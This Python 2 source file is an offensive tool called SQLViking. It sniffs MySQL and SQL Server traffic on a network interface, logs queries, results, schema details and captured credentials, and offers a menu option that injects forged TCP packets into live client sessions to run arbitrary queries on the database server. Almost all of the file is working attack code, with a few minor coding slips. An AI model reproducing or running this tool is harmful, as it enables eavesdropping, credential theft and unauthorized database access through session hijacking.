from os import walk
from operator import itemgetter
from scapy.all import *
import sys, getopt, re, argparse, threading, datetime, signal
sys.path.append("databases/")
from constantvalues import *
#import constantvalues
import mysql,sqlserver,Queue

dbQueue1 = Queue.Queue()
dbQueue2 = Queue.Queue()
injectionQueue = Queue.Queue()
pktQueue = Queue.Queue()

settings = {}
DATABASELIST = {'MYSQL':mysql.MySqlDB(), 'SQLSERV':sqlserver.SqlServerDB()}

class Conn():
    def __init__(self,cip,cport,sip,sport,state,db,nextcseq=-1,nextsseq=-1):
        self.cip      = cip # client ip
        self.cport    = cport
        self.sip      = sip # server ip
        self.sport    = sport
        self.db       = db
        self.frag     = []
        self.state    = state
        self.nextcseq = nextcseq
        self.nextsseq = nextsseq
        self.currentUser = ''
        self.currentInstance = ''

    def storeTraffic(self,data,pktType):
        if pktType==RESPONSE and len(self.db.traffic) > 0 and self.db.traffic[-1].result == None: #is result
            self.db.traffic[-1].result = data
        elif pktType==RESPONSE: #is result, missed query
            self.db.traffic.append(Traffic(result=data))
        else: #is query
            self.db.traffic.append(Traffic(query=data))

    def setInstance(self,instName):
        if instName not in self.db.instances:
            self.db.instances[instName] = Instance(instName)
        self.currentInstance = self.db.instances[instName]

    def foundTable(self,tableName):
        self.currentInstance.addTable(tableName)

    def foundCol(self,tableName,colName):
        self.db.currentInstance.addColumn(tableName,colName)

class Database():
    def __init__(self,dbType,ip,port):
        self.ip          = ip
        self.port        = port
        self.dbType      = dbType
        self.traffic     = []
        self.credentials = [] # username/hash pairs
        self.instances   = {}

    def addUser(self,u):
        if u not in self.users:
            self.users.append(u)

    #god i'm dumb. this logic should be moved out of database class; should return json formatted data. main thread can format into whatever format desired.
    def getTraffic(self,mode):
        if mode.upper() == 'HUMAN':
            resp = '\n%s%s@%s:%s%s\n\n'%('-'*20,self.dbType,self.ip,self.port,'-'*20)
            resp += 'Credentials:\n'
            if len(self.credentials) > 0:
                for u,p in self.credentials:
                    resp += '\t%s : %s\n'%(u,p)
            else:
                resp += 'No credentials harvested\n'

            resp += '\nInstances:\n'
            if len(self.instances) > 0:
                for instanceName,instance in self.instances.iteritems():
                    resp += '%s\n'%instanceName
                    for tableName,table in instance.tables.iteritems():
                        resp += '\t%s:\t%s\n'%(tableName, ', '.join(table.columns))
            else:
                resp += 'No instances identified\n' 

            resp += '\nTraffic:\n'
            for t in self.traffic:
                resp += '\n--Timestamp--\n%s\n'%t.timestamp
                resp += '--Request--\n'
                if t.query:
                    for q in t.query:
                        resp += '%s\n'%q
                else:
                    resp += 'None\n'
                resp += '--Response--\n'
                if t.result:
                    for r in t.result:
                        resp += '%s\n'%r
                else:
                    resp += 'None\n'
            return resp
        else:
            return 'Format not yet implemented\n\n'

class Instance():
    def __init__(self,name,tables={}):
        self.name = name
        self.tables = {}

    def addTable(self,tableName):
        if tableName not in self.tables:
            self.tables[tableName] = Table(tableName)

    def addColumn(self,tableName,colName):
        self.tables[tableName].addColumn(colName)

class Table():
    def __init__(self,name,cols=[]):
        self.name = name
        self.columns = cols

    def addColumn(self,colName):
        if colName not in self.columnss:
            self.columns.append(colName)

class Traffic():
    def __init__(self,query=None,result=None,instance=None):
        self.query = query
        self.result = result
        self.timestamp = datetime.datetime.now()
        self.instance = instance

class Scout(threading.Thread):
    def __init__(self,interface="eth0"):
        threading.Thread.__init__(self)
        self.knownDatabases = []
        self.die = False
        self.interface = interface

    def run(self):
        lfilter = lambda (r): TCP in r
        while not self.die:
            while not dbQueue2.empty():
                self.knownDatabases.append(dbQueue2.get())
            try:
                sniff(prn=pktQueue.put,filter="tcp",store=0,timeout=5,iface=self.interface)
                #sniff(prn=self.putPkt,filter="tcp",store=0,timeout=5,iface=self.interface)
            except:
                print sys.exc_info()[1]
                self.die = True

    #for debugging, offloaded logic into Parse.getConn() func to keep from bogging down this thread
    #def putPkt(self,pkt):
    #    for db in self.knownDatabases:
    #        if (pkt[IP].src == db.ip and pkt[TCP].sport == db.sport) or (pkt[IP].dst == db.ip and pkt[TCP].dport == db.port):
    #            pktQueue.put(pkt)

class Parse(threading.Thread):
    def __init__(self,interface="eth0",debug=False):
        threading.Thread.__init__(self)
        self.die = False
        self.toInject = []
        self.knownDatabases = []
        self.knownConns = []
        self.fingerprint = False
        self.interface = interface
        self.debug = debug

    def getNumQueries(self):
        l = 0
        for db in self.knownDatabases:
            l += len(db.traffic)
        return l

    def getNumConns(self):
        return len(self.knownConns)

    def getNumDBs(self):
        return len(self.knownDatabases)

    def dprint(self,s):
        if self.debug == 'True':
            print(s)

    def dumpResults(self,format):
        data = ''
        for db in self.knownDatabases:
            data += db.getTraffic(format)
        return data

    def run(self):
        global dbQueue1,injectionQueue,pktQueue
        while not self.die:
            while not dbQueue1.empty():
                self.knownDatabases.append(dbQueue1.get())
            while not injectionQueue.empty():
                self.toInject.append(injectionQueue.get())
            if not pktQueue.empty():
                self.handle(pktQueue.get())
        #for db in self.knownDatabases:
        #    print db.getTraffic(HUMAN)

    def getConn(self,pkt):
        for c in self.knownConns:
            if pkt[IP].src  == c.cip and pkt[IP].dst == c.sip and pkt[TCP].sport == c.cport and pkt[TCP].dport == c.sport: #is req
                return c
            elif pkt[IP].src == c.sip and pkt[IP].dst == c.cip and pkt[TCP].sport == c.sport and pkt[TCP].dport == c.cport: #is resp
                return c

        for db in self.knownDatabases:
            if pkt[IP].src == db.ip and pkt[TCP].sport == db.port: #new resp
                c = Conn(cip=pkt[IP].dst,cport=pkt[TCP].dport,sip=db.ip,sport=db.port,state=None,db=db)
                self.knownConns.append(c) 
                return c
            elif pkt[IP].dst == db.ip and pkt[TCP].dport == db.port: #new req
                c = Conn(cip=pkt[IP].src,cport=pkt[TCP].sport,sip=db.ip,sport=db.port,state=None,db=db)
                self.knownConns.append(c) 
                return c

        if self.fingerprint:
            return #todo

    def parse(self,conn):
        payload = ''
        for p in conn.frag:
            payload += str(p[TCP].payload)

        if conn.frag[0][IP].src == conn.sip and conn.frag[0][TCP].sport == conn.sport: #is response
            conn.storeTraffic(DATABASELIST[conn.db.dbType].parseResp(payload,conn),RESPONSE)
        else: #is request
            conn.storeTraffic(DATABASELIST[conn.db.dbType].parseReq(payload,conn),REQUEST)

        conn.frag = []

    def handle(self,pkt):
        #even with TCP filter set on scapy, will occassionally get packets
        #with no TCP layer. throws exception and breaks thread.
        pkts = []
        try:
            pkt[TCP]
        except:
            return

        c  = self.getConn(pkt)
        if c is None:
            return

        if pkt[TCP].flags == 24: #don't inject after fragged pkt, we'll lose that race
            for i in self.toInject: 
                #self.printLn("[1] %s %s %s %s %s %s"%(c.db.ip,i[1],c.db.port,i[2],pkt[TCP].sport,pkt[TCP].flags))
                if c.db.ip == i[1] and c.db.port == i[2] and pkt[TCP].sport == i[2]: #make sure to inject after db response to increase likelihood of success
                    #self.printLn("[2] attempting injection")
                    #self.printLn(databaseList[c.db.dbType].encodeQuery(i[0]).encode('hex'))
                    #sendp(Ether(dst=pkt[Ether].src,src=pkt[Ether].dst)/IP(dst=i[1],src=c.cip)/TCP(sport=c.cport,dport=i[2],flags=16,seq=c.nextcseq,ack=pkt[TCP].seq+len(pkt[TCP].payload)))
                    sendp(Ether(dst=pkt[Ether].src,src=pkt[Ether].dst)/IP(dst=i[1],src=c.cip)/TCP(sport=c.cport,dport=i[2],flags=24,seq=c.nextcseq,ack=pkt[TCP].seq+len(pkt[TCP].payload))/DATABASELIST[c.db.dbType].encodeQuery(i[0]),iface=self.interface)
                    self.toInject.remove(i)

        #check for control packets
        if pkt[TCP].flags == 17: #FIN/ACK pkt
            self.knownConns.remove(c)
            return
        elif pkt[TCP].flags == 2: #SYN pkt
            c.nextcseq = pkt[TCP].seq+1
            return
        
        #TODO: invesitgate this further; are these ACK pkts?
        #empty pkt, no reason to parse. scapy sometimes returns empty pkts with [tcp].payload of several '0' values
        if len(pkt[TCP].payload) == 0 or (len(pkt[TCP].payload) <= 16 and str(pkt[TCP].payload).encode('hex') == '00'*len(pkt[TCP].payload)): 
            return
        
        # this destroys any kind of out-of-order fault tolerance. need to rethink.
        #if pkt[IP].src == c.cip and pkt[TCP].sport == c.cport and c.nextcseq != -1 and c.nextcseq != pkt[TCP].seq: #is a bad req
        #    return
        #elif pkt[IP].dst == c.cip and pkt[TCP].dport == c.cport and c.nextsseq != -1 and c.nextsseq != pkt[TCP].seq: #is a bad resp
        #    return

        c.frag.append(pkt)
        if (pkt[TCP].flags >> 3) % 2 == 0:
            return
        self.parse(c)

        if pkt[IP].src == c.cip and pkt[TCP].sport == c.cport:
            c.nextcseq = len(pkt[TCP].payload)+pkt[TCP].seq
        else:
            c.nextsseq = len(pkt[TCP].payload)+pkt[TCP].seq

def dprint(s):
    global settings
    if settings['debug']:
        print(s)

def parseConfig(f):
    global dbs,toInject
    settings = {}
    DATABASES = 0
    INJECTION = 1
    DATA = 2
    MISC = 3

    flag = -1
    with open(f,'r') as f:
        for l in f:
            l = l.strip().split('#')[0]
            if len(l) == 0:
                continue #donothing
            elif '[Databases]' in l:
                flag = DATABASES
            elif '[Injection]' in l:
                flag = INJECTION
            elif '[Data]' in l:
                flag = DATA
            elif '[Misc]' in l:
                flag = MISC
            elif flag == DATABASES:
                l = l.split(':')
                #dprint('[?] Parsing line for db info:\t%s'%l)
                dbQueue1.put(Database(l[0],l[1].strip(),int(l[2])))
                dbQueue2.put(Database(l[0],l[1],l[2]))
            elif flag == INJECTION:
                injectionQueue.put(l)
            elif flag == DATA:
                settings[l.split('=')[0].strip()] = l.split('=')[1].strip()
            elif flag == MISC:
                settings[l.split('=')[0].strip()] = l.split('=')[1].strip()

    return settings

def isValidIP(ip):
    if len(ip.split('.')) != 4:
        return False
    for oct in ip.split('.'):
        try:
            if int(oct) < 0 or int(oct) > 256:
                return False
        except ValueError:
            return False
    return True

def isValidPort(port):
    try:
        if int(port) < 0 or int(port) > 65565:
            return False
    except ValueError:
        return False
    return True

def isValidDbType(dbType):
    if dbType in DATABASELIST:
        return True
    else:
        return False

def writeResults(t):
    global settings
    print('[*] Enter filepath to write to:')
    path = raw_input("> ")
    data = t.dumpResults(settings['format'])
    with open(path,'w') as f:
        f.write(data)

def addDb(t):
    ip = ''
    port = ''
    dbtype = ''

    while(not isValidIP(ip)):
        print('[*] Enter IP of DB')
        ip = raw_input('> ')
    while(not isValidPort(port)):
        print('[*] Enter port of DB')
        port = raw_input('> ')
    while(not isValidDbType(dbtype)):
        print('[*] Enter type of DB')
        dbtype = raw_input('> ').upper()

    dbQueue1.put(Database(ip=ip,port=port,dbType=dbtype))

def pillage():
    global queries
    print('[*] Enter query to execute:')
    query = raw_input("> ")
    print('[*] Enter IP to execute against:')
    ip = raw_input("> ")
    print('[*] Enter port to execute against:')
    port = raw_input("> ")
    print('[*] Run "%s" against %s:%s? [y/n]'%(query,ip,port))
    ans = raw_input("> ")
    if ans == 'y' or ans == 'Y':
        injectionQueue.put([query,ip,int(port)])
        print('[*] Query will run as soon as possible')
    else:
        print('[*] Cancelling...')
    time.sleep(3)

def parseInput(input,t):
    if input == 'w':
        writeResults(t)
    elif input == 'r':
        pillage()
    elif input == 'a':
        addDb(t)
    elif input == 'q':
        raise KeyboardInterrupt
    else:
        print('Unknown command entered')

def wipeScreen():
    y,x = os.popen('stty size', 'r').read().split()
    print('\033[1;1H')
    for i in range(0,int(y)):
        print(' '*int(x))
    print('\033[1;1H')

class AlarmException(Exception):
    pass

def alarmHandler(signum, frame):
    raise AlarmException

def nonBlockingRawInput(t, prompt='> ', timeout=5):
    signal.signal(signal.SIGALRM, alarmHandler)
    signal.alarm(timeout)
    try:
        text = raw_input(prompt)
        signal.alarm(0)
        parseInput(text,t)
    except AlarmException:
        printMainMenu(t)
    signal.signal(signal.SIGALRM,signal.SIG_IGN)
    return ''

def printMainMenu(t,wipe=True):
    if wipe:
        wipeScreen()
        y,x = os.popen('stty size', 'r').read().split()

    print('{{:^{}}}'.format(x).format('===Welcome to SQLViking==='))
    print('\n[*] Current number of known DBs:\t\t%s'%t.getNumDBs())
    print('[*] Current number of known connections:\t%s'%t.getNumConns())
    print('[*] Current number of queries capured:\t\t%s'%t.getNumQueries())
    print('\n[*] Menu Items:')
    print('\tw - dump current results to file specified')
    print('\ta - add new DB to track')
    print('\tr - run a query against a specified DB')
    print('\tq - quit')

def main():
    global settings

    parser = argparse.ArgumentParser(description='Own the network, own the database', prog='sqlviking.py', usage='%(prog)s [-v] -c <config file location>', formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=65, width =150))
    parser.add_argument('-v', '--verbose', action='store_true', help='Turn on verbose mode; will print out all captured traffic')
    parser.add_argument('-c', '--configfile', default='sqlviking.conf', help='Config file location, defaults to sqlviking.conf')
    args = parser.parse_args()

    try:
        settings = parseConfig(args.configfile)
    except IOError:
        print('[!] Error reading config file. Exiting...')
        sys.exit(0)

    t1 = Scout(settings['interface'])
    t2 = Parse(interface=settings['interface'],debug=settings['debug'])
    t1.start()
    t2.start()

    #printMainMenu(t2)
    #while True:
    #    nonBlockingRawInput(t2)

    try:
        printMainMenu(t2)
        while True:
            nonBlockingRawInput(t2)
    except KeyboardInterrupt:
        print('\n[!] Shutting down...')
        t1.die = True
        t2.die = True
    except:
        t1.die = True
        t2.die = True
        #print sys.exc_info()[1]
        for e in sys.exc_info():
            print e

if __name__ == "__main__":
    main()
